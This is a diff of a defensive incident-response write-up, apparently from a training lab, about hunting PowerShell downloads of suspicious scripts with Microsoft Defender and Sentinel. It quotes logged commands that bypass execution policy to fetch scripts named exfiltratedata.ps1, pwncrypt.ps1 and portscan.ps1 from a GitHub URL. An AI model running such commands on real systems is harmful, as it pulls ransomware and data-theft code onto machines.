@@ -10,7 +10,7 @@
 
 ##  Scenario
 
-Management has raised concerns about potential attempts to download malicious tools or payloads directly within our network. Logs for one of the flagged virtual machined display incidents where PowerShell launched. Microsoft Defender for Endpoint also flagged repeated download attempts from unfamiliar scripts, which also look suspicious. At this stage, it is unclear whether any of the scripts have been successfully downloaded or executed, prompting immediate investigation. The goal is to detect any use of the "Invoke-WebRequest" command - a method that can potentially download or execute external scripts while bypassing detection mechanisms - and to analyze any downloaded scripts or files to mitigate risks of unauthorized access. 
+Management has raised concerns about potential attempts to download malicious tools or payloads directly within our network. Logs for one of the flagged virtual machines displays incidents where PowerShell launched. Microsoft Defender for Endpoint also flagged repeated download attempts from unfamiliar scripts, which also look suspicious. At this stage, it is unclear whether any of the scripts have been successfully downloaded or executed, prompting immediate investigation. The goal is to detect any use of the "Invoke-WebRequest" command - a method that can potentially download or execute external scripts while bypassing detection mechanisms - and to analyze any downloaded scripts or files to mitigate risks of unauthorized access. 
 
 ### High-Level Incident Response Plan
 
@@ -24,7 +24,7 @@ Management has raised concerns about potential attempts to download malicious to
 
 ### 1. Searched the `DeviceProcessEvents` Table
 
-Searched for instances within the last 24 hours where PowerShell was downloaded using the `Invoke-WebRequest` command for Device: "Windows-Target-1". Identified 24 such incidents, where the following commands were executed: 
+Searched for instances within the last 24 hours where PowerShell was downloaded using the `Invoke-WebRequest` command for Device: "windows-target-1". Identified 24 such incidents, where the following commands were executed: 
 
 a)InitiatingProcessCommandLine
             
@@ -36,22 +36,24 @@ b)ProcessCommandLine
         powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
 
 
-The suspicious  web request was triggered on 1 device: "Windows-Target-1 by 1 user, but downloaded 4 different scripts with 4 different commands
+The suspicious web request was triggered on 1 device: "windows-target-1 by 1 user, but downloaded 4 different scripts with 4 different commands
 
- windows-target-1
- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
- 
- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
- 
- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
- 
- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
 
+<ul>
+<li>eicar.ps1</li>
+
+<li>portscan.ps1</li>
+
+<li>pwncrypt.ps1</li>
+
+<li>exfiltratedata.ps1</li>
+</ul>
 
 
 **Query used to locate events:**
 
-![image](https://github.com/user-attachments/assets/fd5b08dc-4b2b-4b06-ad0c-24801f09a2ea)
+![image](https://github.com/user-attachments/assets/89c2a2cc-e446-42a5-bc7c-446429ad29ed)
+
 
 <p>
 <img src="https://github.com/user-attachments/assets/f70f72a2-79eb-450a-bb2c-4efcc849507d"  alt="KQL Query Results"/> &emsp; &emsp;
@@ -63,36 +65,43 @@ The suspicious  web request was triggered on 1 device: "Windows-Target-1 by 1 us
 
 ### 2. Searched the `DeviceProcessEvents` Table a Second Time
 
-Searched for instances where the following scripts within the last 5 hours to see if the malicious IP addresses discovered in Step 1 successfully logged into any devices. No successful logins were detected from these IP addresses.
+Searched for instances where the following scripts: `eicar.ps1`, `portscan.ps1`, `pwncrypt.ps1`, `exfiltratedata.ps1` were succesfullly executed. It was later discovered that all 4 scripts were indded.
 
 **Query used to locate events:**
 
-![image](https://github.com/user-attachments/assets/49941831-9220-4af4-8cea-7b20498a80c0)
+![image](https://github.com/user-attachments/assets/9347c43d-f38d-4873-8e55-e6c4062ec09a)
 
-![image](https://github.com/user-attachments/assets/c7602fa3-db3e-4ef1-aa10-5e8f5e7f79a6)
+![image](https://github.com/user-attachments/assets/1eb274cc-2d4c-43a6-a4ca-417e7fb7ca98)
+![image](https://github.com/user-attachments/assets/724222a9-6361-4704-aa8f-304ee8e89d6a)
 
----
+Summarized by Count: 
 
-### 3. Isolated the affected devices in Microsoft Defender
+![image](https://github.com/user-attachments/assets/8919ead5-4916-4dbc-940f-504f3ceb39bc)
 
-All 8 impacted devices were isolated in Microsoft Defender for Endpoint, and an antimalware scan was run to ensure no malware was present.
-
-**Ex. 1: Device: win-vm-grand:**
-![image](https://github.com/user-attachments/assets/759080c1-42e8-4875-bae7-c6fef186d571)
 
 ---
 
-### 4. Updated NSG(network security group) attached to the virtual machine
+### 3. Isolated the affected device in Microsoft Defender
 
-The network security group (NSG) rules were updated to block RDP access from the public internet. RDP is now only accessible from authorized home IP addresses to maintain secure remote access. As a result, any RDP attempt from unauthorized IP addresses will be denied by a default deny rule at the bottom of the NSG rule list.
+Device: `windows-target-1` was isolated in Microsoft Defender for Endpoint, and an antimalware scan was run to ensure no malware was present.
 
-![image](https://github.com/user-attachments/assets/aaef6360-8393-48cd-bd03-2b5deb64321d)
+**Ex. 1: Device: windows-target-1:**
+![image](https://github.com/user-attachments/assets/cc6460f8-c4bb-4575-86ba-b26be8c531b9)
 
-A corporate policy proposal was also submitted to enforce this configuration for all virtual machines moving forward.
 
 ---
 
-### 5. Restored impacted virtual machines
+### 4. Enforced Cybersecurity Awareness Training
+
+Enrolled affected user in additional cybersecurity awareness training and upgraded organization-wide security awareness program (KnowBe4) to a more robust package with increased training frequency.
+
+Implemented a policy change that limited/restricted PowerShell usage to authorized personnel only.
+
+Enhanced endpoint monitoring for script execution activities.
+
+---
+
+### 5. Restored impacted virtual machine
 
 Reviewed and completed write-up for incident resolution. Finalized reporting and closed out the incident in Microsoft Sentinel as a true positive.
 
